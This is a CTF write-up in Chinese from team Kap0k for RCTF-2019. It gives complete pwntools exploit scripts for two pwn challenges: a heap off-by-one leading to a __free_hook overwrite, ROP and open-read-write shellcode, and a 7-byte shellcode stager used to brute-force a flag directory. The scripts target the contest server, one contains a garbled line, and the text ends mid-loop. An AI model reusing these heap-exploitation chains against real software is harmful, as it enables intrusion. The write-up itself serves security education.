# Kap0k-Note: RCTF-2019 Writeup
> RCTF-2019: Kap0k排名第六  
>  我们misc贼强
## pwn
### babyheap
> 类似 2019-starctf 的heap_master, 但这里并不改dl_open_hook, 而是改_free_hook
#### 解题
  1. edit的时候off by one
  2. 使用`seccomp-tools dump babyheap` 可以看到关闭了execve系统调用, 只能使用open, read, write三个系统调用读出flag
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
     0002: 0x06 0x00 0x00 0x00000000  return KILL
     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
     0004: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0006
     0005: 0x06 0x00 0x00 0x00000000  return KILL
     0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
     0007: 0x06 0x00 0x00 0x00000000  return KILL
     0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
     0009: 0x06 0x00 0x00 0x00000000  return KILL
     0010: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0012
     0011: 0x06 0x00 0x00 0x00000000  return KILL
     0012: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0014
     0013: 0x06 0x00 0x00 0x00000000  return KILL
     0014: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0016
     0015: 0x06 0x00 0x00 0x00000000  return KILL
     0016: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0018
     0017: 0x06 0x00 0x00 0x00000000  return KILL
     0018: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0020
     0019: 0x06 0x00 0x00 0x00000000  return KILL
     0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#### 利用过程
  * leak heap, leak libc
  * 写rop, shellcode到heap
  * largebin attack & unsortbin attack直接在libc上的free_hook分配chunk
  * 栈转移到heap上
  * 执行rop
  * 执行shellcode
#### exp
    # -*- coding:utf-8 -*-    from pwn import *
    # context.log_level = 'debug'
    binary = './babyheap'
    llibc = '/lib/x86_64-linux-gnu/libc.so.6' # /lib/i386-linux-gnu/libc.so.6
    elf = ELF(binary, checksec = 0)
    libc = ELF(llibc, checksec = 0)
    ip="139.180.215.222"
    port= 20001
    # r = process(binary, aslr = 1)
    sd = lambda x : r.send(x)
    sl = lambda x : r.sendline(x)
    rv = lambda x = 2048 : r.recv(x)
    ru = lambda x : r.recvuntil(x)
    rl = lambda : r.recvline()
    ia = lambda : r.interactive()
    ra = lambda : r.recvall()
    def add(size):
        ru("Choice:")
        sl("1")
        ru("Size")
        sl(str(size))
    def edit(idx,con):
        ru("Choice:")
        sl("2")
        ru("Index:")
        sl(str(idx))
        ru("Content:")
        sd(con)    
    def show(idx):
        ru("Choice:")
        sl("4")
        ru("Index:")
        sl(str(idx))
    def free(idx):
        ru("Choice:")
        sl("3")
        ru("Index:")
        sl(str(idx))
    def exp():
        add(0x78) #0
        add(0x38)#1 用1来控制largin的大小
        add(0x420)#2
        add(0x30)#3 +0x4f0
        add(0x60)#4
        add(0x20)#5
        add(0x88) #6
        add(0x48)#7 con
        add(0x420)#8
        add(0x20)#9
        add(0x100)#10 用来写gadget的结构
        add(0x400)#11 用来写rop链和shellcode
        # gdb.attach(r)
        free(0)
        edit(2,0x3f0*'a'+p64(0x100)+p64(0x31))
        edit(1,'a'*0x30+p64(0x80+0x40)) # off
        free(2)
        add(0x78)#0
        show(1)
        libc.address=u64(rl()[1:-1].ljust(8,'\x00'))-3951480
        success("libcbase: "+hex(libc.address))
        add(0x30)#2==1
        free(4)
        free(2)
        show(1)
        heapbase=u64(rl()[1:-1].ljust(8,'\x00'))-528-0x300-0x20
        success("heapbase: "+hex(heapbase))
        add(0x50)#2 进入large
        free(6)
        edit(8,0x3f0*'a'+p64(0x100)+p64(0x31))
        edit(7,'a'*0x40+p64(0x90+0x50)) # off
        free(8)
        add(0x430)#4==1
        add(0x88) #6
        add(0x440)#8==7
        #large attack & unsotbin attack
        free(4)
        free(8)
        add(0x440)#4
        free(4)
        edit(7,p64(0)+p64(libc.sym['__free_hook']-0x20))
        edit(1,p64(0)+p64(libc.sym['__free_hook']-0x20+8)+p64(0)+p64(libc.sym['__free_hook']-0x20-0x18-5))
        add(0x48) #4- __free_hook
        edit(4,'a'*16+p64(libc.address+0x0000000000047b75)) #写__free_hook 为 0x0000000000047b75 : mov rsp, qword ptr [rdi + 0xa0] ...
        # rsp 控制到heapbase+0x10+3104的位置 idx11
        # 0x0000000000021102 : pop rdi ; ret
        rop=p64(0x0000000000021102+libc.address)+p64(heapbase)
        # 0x00000000001150c9 : pop rdx ; pop rsi ; ret
        rop+=p64(0x00000000001150c9+libc.address)+p64(7)+p64(0x2000)+p64(libc.sym['mprotect'])
        rop+=p64(heapbase+0x48+3104)
        code = """
                xor rsi,rsi
                mov rax,SYS_open
                call here
                .string "./flag"
                here:
                pop rdi
                syscall
                mov rdi,rax
                mov rsi,rsp
                mov rdx,0x100
                mov rax,SYS_read
                syscall
                mov rdi,1
                mov rsi,rsp
                mov rdx,0x100
                mov rax,SYS_write
                syscall
                mov rax,SYS_exit
                syscall
            """
        shellcode = asm(code,arch="amd64")
        rop+=shellcode
        edit(11,rop)
        edit(10,flat({0xa0:p64(heapbase+0x10+3104),0xa8:p64(0x0000000000209B5+libc.address)}))
        # 触发
        # gdb.attach(r,"awatch __free_hook\nc\n")
        free(10)
        ia()
    while 1:
        try:
            r = remote(ip,port)
            exp()
        except:
            r.close()
            pass
### shellcoder
> 爆破之(虽然主办方说不需要爆破)
#### 解题思路
> 只能orw
  1. 一开始只能输入7个byte的shellcode, 需要使用7bytes构造一个系统调用. 这里需要知道的是有一条汇编指令: xchg, 可以交换两个64位寄存器的值, xchg rdi,rsi
  2. 有了read系统调用, 就可以执行orw了.
  3. 由于不知道flag的目录, 执行系统调用sys_getdents, 实现一个类似 ls 的功能
  4. 爆破除flag的目录
#### 参考
#### exp
    #!/usr/bin/env python
    from pwn import *
    context(arch='amd64',os='linux')
    # context.log_level='debug'
    # 
    def exp(dirname):
        child_dir=[]
        # p=process('./shellcoder')
        p=remote('139.180.215.222',20002)
        # gdb.attach(p,'nb 4c7')
        p.recvuntil('hello shellcoder:')
        shellcode='\x48\x87\xf7'         #chg rdi, rsi 
        shellcode+='\xb2\x80'          # mov dl,0x80     
        shellcode+='\x0f\x05'          # syscall
        p.send(shellcode)
        # open_code=shellcraft.open('flag/n9bp/1maz/flag')
        # open_code=shellcraft.open('./flag/n0qf/y1ka/fl8q')
        # read_code='xor rax,rax;mov rdi,3;push rsp;pop rsi;mov rdx,100;syscall'
        # write_code='mov rax,1;mov rdi,1;push rsp;pop rsi;mov rdx,100;syscall'
        # shellcode='\x90'*0x7+asm(open_code)+asm(read_code)+asm(write_code)
        open_code=shellcraft.open(dirname)
        getdents_code='mov rax,78;mov rdi,3;mov rsi,rsp;mov rdx,200;syscall'
        write_code='mov rax,1;mov rdi,1;push rsp;pop rsi;mov rdx,200;syscall'
        shellcode='\x90'*0x7+asm(open_code)+asm(getdents_code)+asm(write_code)
        p.send(shellcode+'\n')
        result=[]
        def parse1():
            sleep(1)
            line=p.recv()
            d=0             # line[i] ptr
            while(d0x7e:
                        child_dir.append(line[d+18:d+18+j])
                        break
                clen=u16(line[d+16:d+18])
                d+=clen
                if(clen==0):
                    break
            for i in range(len(child_dir)):
                if child_dir[i]!='' and child_dir[i]!='.' and child_dir[i]!='..':
                    result.append(dirname+'/'+child_dir[i])
        parse1()
        return result
    def judge(line):
        for i in range(len(line)):
            if 'flag' in (line[i])[6:]:
                print(line[i])
                pause()
    fdir=['./flag']
    child_dir=[]
    level=0
    while(1):
        for i in range(len(fdir)):
            child_dir+=exp(fdir[i])
        judge(child_dir)
        fp=open('./dir{}'.format(level),'w')